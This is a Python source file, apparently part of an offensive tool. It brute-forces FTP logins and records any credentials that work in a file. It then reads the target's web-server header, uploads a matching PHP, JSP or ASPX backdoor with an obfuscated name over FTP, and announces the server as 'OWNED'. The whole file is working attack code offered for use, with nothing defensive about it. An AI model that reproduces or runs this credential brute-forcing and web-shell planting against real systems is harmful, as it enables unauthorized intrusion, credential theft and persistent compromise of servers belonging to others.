import ftplib
from ftplib import FTP
import os
import requests
from colorama import Fore # for fancy colors, nothing else

output = open('cracked.txt', 'a')
    
def is_correct(u,password,host,port):
    # initialize the FTP server object
    server = ftplib.FTP()
    print("[" + Fore.CYAN + "Trying" + Fore.RESET + "] " + u + ':' + password)
    try:
        # tries to connect to FTP server with a timeout of 5
        server.connect(host, port, timeout=10)
        # login using the credentials (user & password)
        server.login(u, password)
    except ftplib.error_perm:
        # login failed, wrong credentials
        return False
    except EOFError:
        print('EOF')
    except OSError:
        print("[" + Fore.CYAN + "Host" + Fore.RESET + "] " + host + Fore.YELLOW + " not found" + Fore.RESET)
    
    else:
        # correct credentials
        print("[" + Fore.CYAN + "Found Credentials" + Fore.RESET + "] " + u + ':')
        output.write('[Bruteforced Account] ' + host + ' ' + u + ':' + password + '\n')
        
        print("[" + Fore.CYAN + "Uploading Backdoor" + Fore.RESET + "] ")
        try:
            ftp = FTP()
            ftp.connect(host=host,port=port,timeout=10)
            result = ftp.login(u,password)
            try:
                r = requests.get("http://" + host)
                web_server = r.headers['Server']
            except:
                pass
            
             
            if 'Apache' in web_server or 'nginx' in web_server:
                payload = 'xtrfhrjuyt56.php'
            if 'Coyote' in web_server or 'Tomcat' in web_server:
                payload = 'xtrfhrjuyt56.jsp'
            if 'Microsoft' in web_server:
                payload = 'xtrfhrjuyt56.aspx'
            
            with open(payload, 'rb') as file:
                ftp.storbinary(f"STOR {payload}",file)
                output.write('[Backdoor Uploaded] ' + host + '/' + payload + '\n')
                print("[" + Fore.CYAN + "Upload Successful" + Fore.RESET + "] Uploaded " + payload + Fore.RESET)
                ftp.retrlines("LIST")
                print("[" + Fore.RED + "OWNED" + Fore.RESET + "] FTP Server")
            
        except ftplib.error_perm:
            print("[" + Fore.RED + "Failed" + Fore.RESET + "] File Upload")
            pass
        
        return True
